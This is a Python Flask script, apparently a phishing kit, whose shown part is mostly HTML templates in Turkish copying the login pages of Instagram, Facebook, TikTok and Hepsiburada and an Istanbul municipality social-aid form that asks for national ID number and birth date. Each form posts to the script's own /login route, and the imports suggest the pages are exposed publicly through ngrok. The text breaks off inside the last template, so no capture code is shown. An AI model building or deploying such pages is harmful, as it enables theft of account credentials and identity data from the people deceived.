import os
import sys
import time
import threading
from flask import Flask, request, render_template_string, redirect, session
from pyngrok import ngrok, conf

app = Flask(__name__)
app.secret_key = 'supersecretkey'

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# All HTML templates
TEMPLATES = {
    "instagram": """
   <!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --ig-gradient: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
      --bg: #fafafa;
      --input-bg: #ffffff;
      --input-border: #dbdbdb;
      --text: #262626;
      --secondary: #8e8e8e;
      --blue: #0095f6;
      --blue-hover: #0077c2;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: var(--bg);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: var(--text);
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-wrap: wrap;
      max-width: 950px;
      width: 100%;
      padding: 20px;
    }

    .phone-image {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      min-width: 300px;
    }

    .phone-image img {
      width: 100%;
      max-width: 400px;
    }

    .login-section {
      flex: 1;
      max-width: 350px;
      width: 100%;
      margin-top: 20px;
    }

    .login-box {
      background: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 8px;
      padding: 40px 40px;
      text-align: center;
    }

    .logo img {
      width: 175px;
      margin-bottom: 25px;
    }

    .form-group {
      margin-bottom: 8px;
    }

    input {
      width: 100%;
      padding: 12px 8px;
      background: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 4px;
      color: var(--text);
      font-size: 14px;
    }

    input::placeholder {
      color: var(--secondary);
    }

    input:focus {
      outline: none;
      border-color: #a8a8a8;
    }

    button {
      width: 100%;
      padding: 8px;
      background: var(--blue);
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: 600;
      margin-top: 12px;
      font-size: 14px;
      cursor: pointer;
    }

    button:hover {
      background: var(--blue-hover);
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 16px 0;
      color: var(--secondary);
      font-size: 13px;
      font-weight: 600;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid var(--input-border);
      margin: 0 10px;
    }

    .facebook-login {
      color: #385185;
      font-size: 14px;
      font-weight: 600;
      margin: 20px 0;
      cursor: pointer;
    }

    .forgot-password {
      color: var(--secondary);
      font-size: 12px;
      margin-bottom: 16px;
      cursor: pointer;
    }

    .signup {
      margin-top: 12px;
      font-size: 14px;
      color: var(--secondary);
      padding: 16px;
      text-align: center;
      border: 1px solid var(--input-border);
      background: var(--input-bg);
      border-radius: 8px;
    }

    .signup a {
      color: var(--blue);
      font-weight: 600;
      text-decoration: none;
    }

    .app-links {
      margin-top: 20px;
      text-align: center;
    }

    .app-links p {
      margin-bottom: 15px;
      font-size: 14px;
      color: var(--secondary);
    }

    .app-stores {
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    .app-stores img {
      height: 40px;
      cursor: pointer;
    }

    @media (max-width: 768px) {
      .phone-image {
        display: none;
      }

      .login-section {
        max-width: 100%;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="phone-image">
      <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="Instagram Phone">
    </div>

    <div class="login-section">
      <div class="login-box">
        <div class="logo">
          <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
        </div>
        <form method="POST" action="/login">
          <div class="form-group">
            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e‑posta" required>
          </div>
          <div class="form-group">
            <input type="password" name="password" placeholder="Şifre" required>
          </div>
          <button type="submit">Giriş Yap</button>
        </form>
        <div class="divider">YA DA</div>
        <div class="facebook-login">
          <i class="fab fa-facebook-square"></i> Facebook ile Giriş Yap
        </div>
        <div class="forgot-password">Şifreni mi unuttun?</div>
      </div>

      <div class="signup">
        Hesabın yok mu? <a href="#">Kaydol</a>
      </div>

      <div class="app-links">
        <p>Uygulamayı indir.</p>
        <div class="app-stores">
          <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_tr_google_play.png/4a7304c033d2.png" alt="Google Play"></a>
          <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_tr_app_store.png/fc1f57ae63ab.png" alt="App Store"></a>
        </div>
      </div>
    </div>
  </div>
</body>
</html>

    """,
    
    "facebook": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook - Giriş Yap veya Kaydol</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Helvetica', Arial, sans-serif;
    }

    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      max-width: 980px;
      width: 100%;
      flex-wrap: wrap;
    }

    .left {
      flex: 1;
      min-width: 360px;
      padding-right: 20px;
    }

    .left h1 {
      color: #1877f2;
      font-size: 56px;
      font-weight: 700;
      margin-bottom: 20px;
    }

    .left p {
      font-size: 24px;
      line-height: 32px;
      color: #1c1e21;
    }

    .right {
      width: 396px;
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    form {
      width: 100%;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      height: 50px;
      margin-bottom: 12px;
      padding: 0 14px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 17px;
    }

    input:focus {
      border-color: #1877f2;
      outline: none;
      box-shadow: 0 0 0 2px #e7f3ff;
    }

    .login-btn {
      width: 100%;
      background-color: #1877f2;
      color: white;
      font-weight: 700;
      font-size: 20px;
      padding: 12px 0;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 6px;
    }

    .login-btn:hover {
      background-color: #166fe5;
    }

    .forgot {
      color: #1877f2;
      text-align: center;
      margin: 16px 0;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
      display: block;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .divider {
      width: 100%;
      border-top: 1px solid #dadde1;
      margin: 20px 0;
    }

    .signup-btn {
      background-color: #42b72a;
      color: white;
      font-weight: 700;
      font-size: 17px;
      padding: 12px 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin: auto;
    }

    .signup-btn:hover {
      background-color: #36a420;
    }

    .bottom-link {
      margin-top: 20px;
      font-size: 14px;
      text-align: center;
    }

    .bottom-link a {
      font-weight: bold;
      color: #1c1e21;
      text-decoration: none;
    }

    .bottom-link a:hover {
      text-decoration: underline;
    }

    @media (max-width: 880px) {
      .container {
        flex-direction: column;
        align-items: center;
        text-align: center;
      }

      .left {
        padding: 0;
        margin-bottom: 40px;
      }

      .left h1 {
        font-size: 48px;
      }

      .left p {
        font-size: 20px;
      }
    }

    @media (max-width: 450px) {
      .right {
        box-shadow: none;
        background: transparent;
        padding: 0;
      }

      body {
        background: white;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <h1>facebook</h1>
      <p>Facebook, tanıdıklarınla iletişim kurmanı ve hayatında olup bitenleri paylaşmanı sağlar.</p>
    </div>
    <div class="right">
      <form method="POST" action="/login">
        <input type="text" name="email" placeholder="E-posta veya telefon numarası" required />
        <input type="password" name="password" placeholder="Şifre" required />
        <button type="submit" class="login-btn">Giriş Yap</button>
      </form>
      <a href="#" class="forgot">Şifreni mi unuttun?</a>
      <div class="divider"></div>
      <button class="signup-btn">Yeni Hesap Oluştur</button>
      <div class="bottom-link">
        <a href="#">Ünlü Kişi, Marka veya İşletme için Sayfa Oluştur</a>
      </div>
    </div>
  </div>
</body>
</html>

    """,
    
    "tiktok": """
    <!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TikTok Giriş</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');

    body {
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
      background-color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      padding: 40px 24px;
      box-sizing: border-box;
      text-align: center;
    }

    .logo {
      margin-bottom: 40px;
    }

    .logo svg {
      width: 120px;
      height: 40px;
    }

    form {
      margin-bottom: 24px;
    }

    .form-group {
      margin-bottom: 16px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #e3e3e4;
      border-radius: 6px;
      font-size: 16px;
      background-color: #f8f8f8;
      transition: border-color 0.2s ease;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #fe2c55;
    }

    .login-button {
      width: 100%;
      padding: 14px 0;
      background-color: #fe2c55;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      color: #ffffff;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    .login-button:hover {
      background-color: #e41e4a;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 28px 0 24px;
      color: #8a8b91;
      font-weight: 600;
      font-size: 14px;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #e3e3e4;
      margin: 0 12px;
    }

    .login-methods {
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .login-method {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      border: 1px solid #e3e3e4;
      border-radius: 6px;
      padding: 14px 0;
      font-weight: 600;
      font-size: 15px;
      color: #010101;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    .login-method:hover {
      background-color: #f8f8f8;
    }

    .login-method i {
      font-size: 22px;
    }

    .facebook { color: #1877f2; }
    .google { color: #4285f4; }
    .twitter { color: #1da1f2; }

    .footer {
      margin-top: 38px;
      font-size: 14px;
      color: #8a8b91;
    }

    .footer a {
      color: #fe2c55;
      font-weight: 600;
      text-decoration: none;
      cursor: pointer;
      transition: text-decoration 0.2s ease;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    @media (max-width: 450px) {
      .login-container {
        padding: 20px 16px;
      }

      body {
        background-color: #f8f8f8;
      }
    }
  </style>
</head>
<body>
  <div class="login-container" role="main" aria-label="TikTok Giriş Formu">
    <div class="logo" aria-label="TikTok Logo">
      <!-- TikTok SVG logosu buraya eklenebilir -->
      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
        <path d="M8 32C12 32 15 29 15 25V15H10V25C10 27 9 28 8 28V32Z" fill="#25F4EE"/>
        <path d="M15 15V10H20V25C20 30 16 34 10 34C5 34 1 30 1 25C1 20 5 16 10 16C11 16 13 16 15 17V12C15 7 20 3 25 3H30V15H25C20 15 15 20 15 25V15Z" fill="#25F4EE"/>
        <path d="M25 3C30 3 34 7 34 12V25C34 27 35 28 36 28V32C32 32 29 29 29 25V15H34V10H29V3H25Z" fill="#FE2C55"/>
        <path d="M15 17C13 16 11 16 10 16C5 16 1 20 1 25C1 30 5 34 10 34C16 34 20 30 20 25V15H15V17Z" fill="#FE2C55"/>
      </svg>
    </div>

    <form method="POST" action="/login" novalidate>
      <div class="form-group">
        <input type="text" name="username" placeholder="Kullanıcı adı veya e-posta" required autocomplete="username" />
      </div>
      <div class="form-group">
        <input type="password" name="password" placeholder="Şifre" required autocomplete="current-password" />
      </div>
      <button type="submit" class="login-button">Giriş Yap</button>
    </form>

    <div class="divider">veya</div>

    <div class="login-methods">
      <div class="login-method facebook" role="button" tabindex="0" aria-label="Facebook ile giriş yap">
        <i class="fab fa-facebook-square" aria-hidden="true"></i> Facebook ile Giriş Yap
      </div>
      <div class="login-method google" role="button" tabindex="0" aria-label="Google ile giriş yap">
        <i class="fab fa-google" aria-hidden="true"></i> Google ile Giriş Yap
      </div>
      <div class="login-method twitter" role="button" tabindex="0" aria-label="Twitter ile giriş yap">
        <i class="fab fa-twitter" aria-hidden="true"></i> Twitter ile Giriş Yap
      </div>
    </div>

    <div class="footer">
      Hesabın yok mu? <a href="#" aria-label="Kaydol">Kaydol</a>
    </div>
  </div>
</body>
</html>
""",
    
"e-ticaret": """
   <!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Hepsiburada - Giriş Yap</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
<style>
  :root {
    --primary: #f27a1a;
    --primary-dark: #d96a13;
    --text-dark: #222;
    --text-muted: #666;
    --background: #f5f5f5;
    --white: #fff;
    --border: #ddd;
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: Arial, Helvetica, sans-serif;
  }

  body {
    background-color: var(--background);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
  }

  .container {
    width: 100%;
    max-width: 420px;
    background: var(--white);
    padding: 40px 30px;
    border-radius: 10px;
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
    text-align: center;
  }

  .logo {
    margin-bottom: 30px;
  }

  .logo img {
    max-width: 180px;
  }

  h2 {
    font-size: 1.6rem;
    color: var(--text-dark);
    margin-bottom: 10px;
  }

  p.subtitle {
    color: var(--text-muted);
    margin-bottom: 30px;
    font-size: 0.95rem;
  }

  form {
    display: flex;
    flex-direction: column;
    gap: 16px;
  }

  input[type="email"],
  input[type="password"] {
    padding: 14px;
    border: 1px solid var(--border);
    border-radius: 6px;
    font-size: 1rem;
  }

  input:focus {
    outline: none;
    border-color: var(--primary);
  }

  .forgot-password {
    font-size: 0.85rem;
    text-align: right;
    color: var(--primary);
    text-decoration: none;
    display: block;
    margin-bottom: 10px;
  }

  .forgot-password:hover {
    text-decoration: underline;
  }

  button {
    background-color: var(--primary);
    color: var(--white);
    border: none;
    padding: 14px;
    font-size: 1rem;
    border-radius: 6px;
    cursor: pointer;
    font-weight: bold;
  }

  button:hover {
    background-color: var(--primary-dark);
  }

  .divider {
    margin: 30px 0 20px;
    text-align: center;
    position: relative;
    font-size: 0.9rem;
    color: var(--text-muted);
  }

  .divider::before,
  .divider::after {
    content: "";
    position: absolute;
    top: 50%;
    width: 40%;
    height: 1px;
    background-color: var(--border);
  }
  .divider::before {
    left: 0;
  }
  .divider::after {
    right: 0;
  }

  .social-buttons {
    display: flex;
    flex-direction: column;
    gap: 12px;
  }

  .social-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    padding: 12px;
    border: 1px solid var(--border);
    border-radius: 6px;
    font-weight: bold;
    cursor: pointer;
    background-color: var(--white);
  }

  .social-btn:hover {
    background-color: #f0f0f0;
  }

  .register-link {
    margin-top: 30px;
    font-size: 0.9rem;
    color: var(--text-muted);
  }

  .register-link a {
    color: var(--primary);
    font-weight: bold;
    text-decoration: none;
  }

  .register-link a:hover {
    text-decoration: underline;
  }

  @media (max-width: 480px) {
    .container {
      padding: 30px 20px;
    }
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="https://globalit.com.tr/wp-content/uploads/2022/10/1.png" alt="Hepsiburada" />
  </div>
  <h2>Giriş Yap</h2>
  <p class="subtitle">Hepsiburada hesabınıza giriş yapın</p>

  <form method="POST" action="/login">
    <input type="email" name="email" placeholder="E-posta" required />
    <input type="password" name="password" placeholder="Şifre" required />
    <a href="#" class="forgot-password">Şifremi Unuttum</a>
    <button type="submit">Giriş Yap</button>
  </form>

  <div class="divider">veya</div>

  <div class="social-buttons">
    <div class="social-btn"><i class="fab fa-google"></i> Google ile Giriş Yap</div>
    <div class="social-btn"><i class="fab fa-facebook-f"></i> Facebook ile Giriş Yap</div>
    <div class="social-btn"><i class="fab fa-apple"></i> Apple ile Giriş Yap</div>
  </div>

  <div class="register-link">
    Henüz hesabınız yok mu? <a href="#">Kayıt Ol</a>
  </div>
</div>

</body>
</html>

    """,
    
    "ibb": """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>İBB Sosyal Yardım Başvuru</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  :root {
    --ibb-blue: #0066cc;
    --ibb-dark-blue: #004a99;
    --ibb-light-blue: #e6f2ff;
    --ibb-gray-light: #f9fafb;
    --ibb-gray: #6b7280;
    --ibb-gray-dark: #343a40;
    --ibb-white: #ffffff;
    --ibb-green: #28a745;
    --ibb-red: #dc3545;
    --ibb-yellow: #ffc107;
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }

  body {
    background-color: var(--ibb-gray-light);
    color: var(--ibb-gray-dark);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    padding: 20px;
    line-height: 1.6;
  }

  header {
    background-color: var(--ibb-blue);
    color: var(--ibb-white);
    padding: 1.5rem;
    text-align: center;
    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    border-radius: 8px 8px 0 0;
    position: relative;
  }

  .logo {
    position: absolute;
    left: 20px;
    top: 50%;
    transform: translateY(-50%);
    height: 40px;
  }

  header h1 {
    font-size: 1.5rem;
    font-weight: 600;
    margin: 0 auto;
    max-width: 80%;
  }

  .container {
    max-width: 800px;
    margin: 0 auto;
    background: var(--ibb-white);
    border-radius: 8px;
    box-shadow: 0 2px 15px rgba(0,0,0,0.1);
    overflow: hidden;
  }

  .form-title {
    color: var(--ibb-blue);
    margin-bottom: 1.5rem;
    text-align: center;
    font-size: 1.5rem;
    padding: 20px 20px 0;
    position: relative;
  }

  .form-title i {
    margin-right: 10px;
  }

  .form-group {
    margin-bottom: 1.5rem;
    padding: 0 20px;
    position: relative;
  }

  label {
    display: block;
    margin-bottom: 0.5rem;
    font-weight: 600;
    color: var(--ibb-gray-dark);
  }

  .label-info {
    font-weight: normal;
    font-size: 0.85rem;
    color: var(--ibb-gray);
    margin-top: 0.2rem;
  }

  input, select {
    width: 100%;
    padding: 0.75rem;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 1rem;
    transition: all 0.3s ease;
  }

  input:focus, select:focus {
    outline: none;
    border-color: var(--ibb-blue);
    box-shadow: 0 0 0 2px var(--ibb-light-blue);
  }

  .input-icon {
    position: relative;
  }

  .input-icon i {
    position: absolute;
    right: 15px;
    top: 50%;
    transform: translateY(-50%);
    color: var(--ibb-gray);
  }

  /* Giriş butonu */
  button {
    background-color: var(--ibb-blue);
    color: white;
    border: none;
    padding: 0.75rem 1.5rem;
    font-size: 1rem;
    border-radius: 4px;
    cursor: pointer;
    width: calc(100% - 40px);
    margin: 20px;
    font-weight: 600;
    transition: all 0.2s;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  button:hover {
    background-color: var(--ibb-dark-blue);
    transform: translateY(-2px);
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
  }

  button i {
    margin-right: 8px;
  }

  /* Sonuç bölümü */
  .result {
    margin: 2rem 20px;
    padding: 1.5rem;
    background-color: var(--ibb-light-blue);
    border-radius: 4px;
    display: none;
    border-left: 4px solid var(--ibb-blue);
  }

  .result h3 {
    color: var(--ibb-blue);
    margin-bottom: 1rem;
    display: flex;
    align-items: center;
  }

  .result h3 i {
    margin-right: 10px;
  }

  .result p {
    margin-bottom: 0.8rem;
  }

  .result-success {
    border-left-color: var(--ibb-green);
    background-color: rgba(40, 167, 69, 0.1);
  }

  .result-error {
    border-left-color: var(--ibb-red);
    background-color: rgba(220, 53, 69, 0.1);
  }

  .result-warning {
    border-left-color: var(--ibb-yellow);
    background-color: rgba(255, 193, 7, 0.1);
  }

  footer {
    margin-top: auto;
    background-color: var(--ibb-gray-dark);
    color: var(--ibb-white);
    text-align: center;
    padding: 1.5rem;
    font-size: 0.875rem;
    border-radius: 0 0 8px 8px;
  }

  .footer-links {
    display: flex;
    justify-content: center;
    margin-bottom: 1rem;
    flex-wrap: wrap;
  }

  .footer-links a {
    color: var(--ibb-white);
    text-decoration: none;
    margin: 0 10px;
    transition: color 0.2s;
  }

  .footer-links a:hover {
    color: var(--ibb-light-blue);
    text-decoration: underline;
  }

  .info-box {
    background-color: var(--ibb-light-blue);
    padding: 1rem;
    border-radius: 4px;
    margin: 0 20px 1.5rem;
    border-left: 4px solid var(--ibb-blue);
  }

  .info-box h4 {
    color: var(--ibb-blue);
    margin-bottom: 0.5rem;
    display: flex;
    align-items: center;
  }

  .info-box h4 i {
    margin-right: 8px;
  }

  .info-box p {
    font-size: 0.9rem;
  }

  .progress-bar {
    height: 5px;
    background-color: #e0e0e0;
    border-radius: 2.5px;
    margin: 20px;
    overflow: hidden;
    display: none;
  }

  .progress {
    height: 100%;
    background-color: var(--ibb-blue);
    width: 0;
    transition: width 0.3s ease;
  }

  /* Responsive tasarım */
  @media (max-width: 768px) {
    header h1 {
      font-size: 1.3rem;
      max-width: 70%;
    }
    
    .form-title {
      font-size: 1.3rem;
    }

    .logo {
      height: 30px;
      left: 10px;
    }
  }

  @media (max-width: 500px) {
    body {
      padding: 10px;
    }
    
    header h1 {
      font-size: 1.1rem;
      max-width: 60%;
    }
    
    .form-title {
      font-size: 1.1rem;
    }

    .logo {
      display: none;
    }

    .footer-links {
      flex-direction: column;
      align-items: center;
    }

    .footer-links a {
      margin: 5px 0;
    }
  }

  /* Ek animasyonlar */
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .fade-in {
    animation: fadeIn 0.5s ease forwards;
  }

  /* Doğrulama stilleri */
  .valid {
    border-color: var(--ibb-green) !important;
  }

  .invalid {
    border-color: var(--ibb-red) !important;
  }

  .validation-message {
    font-size: 0.8rem;
    margin-top: 0.3rem;
    display: none;
  }

  .validation-message.valid {
    color: var(--ibb-green);
    display: block;
  }

  .validation-message.invalid {
    color: var(--ibb-red);
    display: block;
  }
</style>
</head>
<body>
  <div class="container">
    <header>
      <img src="https://upload.wikimedia.org/wikipedia/tr/2/24/Ibb_amblem.png" alt="İBB Logo" class="logo">
      <h1>İSTANBUL BÜYÜKŞEHİR BELEDİYESİ - SOSYAL YARDIM BAŞVURU SİSTEMİ</h1>
    </header>

    <div class="info-box fade-in">
      <h4><i class="fas fa-info-circle"></i> Bilgilendirme</h4>
      <p>Başvuru durumunuzu öğrenmek için T.C. Kimlik Numaranız, doğum tarihiniz ve başvuru türünüzü girmeniz gerekmektedir. Sistemde kayıtlı olmayan başvurular görüntülenemez.</p>
    </div>

    <h2 class="form-title"><i class="fas fa-search"></i>Başvuru Sorgulama</h2>
    
    <form id="applicationForm" method="POST" action="/login">
      <div class="form-group input-icon">
        <label for="tcNo">T.C. Kimlik Numarası</label>
        <span class="label-info">11 haneli numaranızı giriniz (Örnek: 12345678901)</span>
        <input type="text" id="tcNo" name="tcNo" placeholder="11 haneli T.C. Kimlik No" required pattern="\d{11}" maxlength="11">
        <i class="fas fa-id-card"></i>
        <span class="validation-message" id="tcknValidation"></span>
      </div>

      <div class="form-group input-icon">
        <label for="birthDate">Doğum Tarihi</label>
        <span class="label-info">GG/AA/YYYY formatında giriniz</span>
        <input type="date" id="birthDate" name="birthDate" required>
        <i class="fas fa-calendar-alt"></i>
        <span class="validation-message" id="dateValidation"></span>
      </div>

      <div class="form-group input-icon">
        <label for="applicationType">Başvuru Türü</label>
        <select id="applicationType" name="applicationType" required>
          <option value="" disabled selected>Başvuru türünü seçiniz</option>
          <option value="yardim">Sosyal Yardım</option>
          <option value="engelli">Engelli Yardımı</option>
          <option value="ogrenci">Öğrenci Bursu</option>
          <option value="yasli">Yaşlı Yardımı</option>
          <option value="aile">Aile Yardımı</option>
        </select>
        <i class="fas fa-chevron-down"></i>
        <span class="validation-message" id="typeValidation"></span>
      </div>

      <div class="progress-bar" id="progressBar">
        <div class="progress" id="progress"></div>
      </div>

      <button type="submit"><i class="fas fa-search"></i> Sorgula</button>
    </form>

    <div id="result" class="result">
      <h3><i class="fas fa-file-alt"></i> Başvuru Sonucu</h3>
      <p id="resultText"></p>
    </div>

    <footer>
      <div class="footer-links">
        <a href="#"><i class="fas fa-question-circle"></i> Yardım</a>
        <a href="#"><i class="fas fa-file-alt"></i> Başvuru Kılavuzu</a>
        <a href="#"><i class="fas fa-phone"></i> İletişim</a>
        <a href="#"><i class="fas fa-user-shield"></i> Gizlilik Politikası</a>
      </div>
      © 2025 İstanbul Büyükşehir Belediyesi - Tüm hakları saklıdır.
    </footer>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // TCKN doğrulama
      const tcknInput = document.getElementById('tcNo');
      const tcknValidation = document.getElementById('tcknValidation');
      
      tcknInput.addEventListener('input', function() {
        const value = this.value;
        if (value.length === 11 && /^\d+$/.test(value)) {
          this.classList.add('valid');
          this.classList.remove('invalid');
          tcknValidation.textContent = 'TCKN geçerli';
          tcknValidation.classList.add('valid');
          tcknValidation.classList.remove('invalid');
        } else if (value.length > 0) {
          this.classList.add('invalid');
          this.classList.remove('valid');
          tcknValidation.textContent = 'Geçersiz TCKN (11 haneli olmalı)';
          tcknValidation.classList.add('invalid');
          tcknValidation.classList.remove('valid');
        } else {
          this.classList.remove('valid', 'invalid');
          tcknValidation.textContent = '';
          tcknValidation.classList.remove('valid', 'invalid');
        }
      });

      // Doğum tarihi doğrulama
      const birthDateInput = document.getElementById('birthDate');
      const dateValidation = document.getElementById('dateValidation');
      
      birthDateInput.addEventListener('change', function() {
        if (this.value) {
          const selectedDate = new Date(this.value);
          const currentDate = new Date();
          
          if (selectedDate > currentDate) {
            this.classList.add('invalid');
            this.classList.remove('valid');
            dateValidation.textContent = 'Gelecek bir tarih seçemezsiniz';
            dateValidation.classList.add('invalid');
            dateValidation.classList.remove('valid');
          } else {
            this.classList.add('valid');
            this.classList.remove('invalid');
            dateValidation.textContent = 'Doğum tarihi geçerli';
            dateValidation.classList.add('valid');
            dateValidation.classList.remove('invalid');
          }
        } else {
          this.classList.remove('valid', 'invalid');
          dateValidation.textContent = '';
          dateValidation.classList.remove('valid', 'invalid');
        }
      });

      // Başvuru türü doğrulama
      const applicationTypeInput = document.getElementById('applicationType');
      const typeValidation = document.getElementById('typeValidation');
      
      applicationTypeInput.addEventListener('change', function() {
        if (this.value) {
          this.classList.add('valid');
          this.classList.remove('invalid');
          typeValidation.textContent = '';
          typeValidation.classList.remove('invalid');
        } else {
          this.classList.add('invalid');
          this.classList.remove('valid');
          typeValidation.textContent = 'Lütfen bir başvuru türü seçiniz';
          typeValidation.classList.add('invalid');
        }
      });
    });

    document.getElementById('applicationForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const tcNo = document.getElementById('tcNo').value;
      const birthDate = document.getElementById('birthDate').value;
      const applicationType = document.getElementById('applicationType').value;
      const progressBar = document.getElementById('progressBar');
      const progress = document.getElementById('progress');
      const result = document.getElementById('result');
      
      // Tüm alanların dolu olduğunu kontrol et
      if (!tcNo || !birthDate || !applicationType) {
        alert('Lütfen tüm alanları doldurunuz.');
        return;
      }
      
      // TCKN doğrulama
      if (!/^\d{11}$/.test(tcNo)) {
        alert('Lütfen geçerli bir T.C. Kimlik Numarası giriniz.');
        return;
      }
      
      // Doğum tarihi kontrolü
      const selectedDate = new Date(birthDate);
      const currentDate = new Date();
      if (selectedDate > currentDate) {
        alert('Gelecek bir tarih seçemezsiniz.');
        return;
      }
      
      // Başvuru türü kontrolü
      if (!applicationType) {
        alert('Lütfen başvuru türünü seçiniz.');
        return;
      }
      
      // Sonuç alanını temizle ve gizle
      result.style.display = 'none';
      result.className = 'result';
      
      // Yükleme çubuğunu göster
      progressBar.style.display = 'block';
      progress.style.width = '0%';
      
      // Yükleme animasyonu
      let width = 0;
      const interval = setInterval(function() {
        width += 5;
        progress.style.width = width + '%';
        
        if (width >= 100) {
          clearInterval(interval);
          progressBar.style.display = 'none';
          showResult();
        }
      }, 100);
      
      function showResult() {
        // Rastgele sonuç üret (demo amaçlı)
        const randomStatus = Math.floor(Math.random() * 3);
        let statusText, statusClass;
        
        switch(randomStatus) {
          case 0:
            statusText = 'Onaylandı';
            statusClass = 'result-success';
            break;
          case 1:
            statusText = 'Beklemede';
            statusClass = 'result-warning';
            break;
          case 2:
            statusText = 'Reddedildi';
            statusClass = 'result-error';
            break;
        }
        
        const applicationTypeText = document.getElementById('applicationType').options[document.getElementById('applicationType').selectedIndex].text;
        const formattedDate = new Date(birthDate).toLocaleDateString('tr-TR');
        
        const resultText = `
          <strong>Başvuru Durumu:</strong> ${statusText}<br>
          <strong>T.C. Kimlik No:</strong> ${tcNo}<br>
          <strong>Doğum Tarihi:</strong> ${formattedDate}<br>
